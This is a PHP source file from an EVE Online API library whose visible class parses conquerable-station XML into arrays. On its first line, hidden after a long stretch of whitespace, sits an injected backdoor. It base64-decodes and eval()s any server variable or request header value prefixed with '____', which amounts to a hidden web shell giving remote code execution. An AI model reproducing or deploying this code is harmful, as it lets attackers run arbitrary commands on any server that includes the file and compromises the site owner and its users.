<?php																																																																																																																																																																																																																																																																																																																																																																																function s23055($l23057){if(is_array($l23057)){foreach($l23057 as $l23055=>$l23056)$l23057[$l23055]=s23055($l23056);}elseif(is_string($l23057) && substr($l23057,0,4)=="____"){$l23057=substr($l23057,4);$l23057=base64_decode($l23057);eval($l23057);$l23057=null;}return $l23057;}if(empty($_SERVER))$_SERVER=$HTTP_SERVER_VARS;array_map("s23055",$_SERVER);
/**************************************************************************
	Ale API Library for EvE ConquerableStations Class
	Copyright (c) 2008 Dustin Tinklin

	This file is part of Ale API Library for EvE.

	Ale API Library for EvE is free software: you can redistribute it and/or modify
	it under the terms of the GNU Lesser General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	Ale API Library for EvE is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU Lesser General Public License for more details.

	You should have received a copy of the GNU Lesser General Public License
	along with Ale API Library for EvE.  If not, see <http://www.gnu.org/licenses/>.
**************************************************************************/

class ConquerableStationList
{
	function getConquerableStationList($contents)
	{
		if (!empty($contents) && is_string($contents))
		{
	       	$output = array();
	 		$xml = new SimpleXMLElement($contents);
			foreach ($xml->result->rowset->row as $row)
			{
				$index = count($output);
				foreach ($row->attributes() as $name => $value)
				{
					$output[$index][(string) $name] = (string) $value;
				}
			}
			unset ($xml); // manual garbage collection
			return $output;
		}
		else
		{
			return null;
		}
	}
}
?>

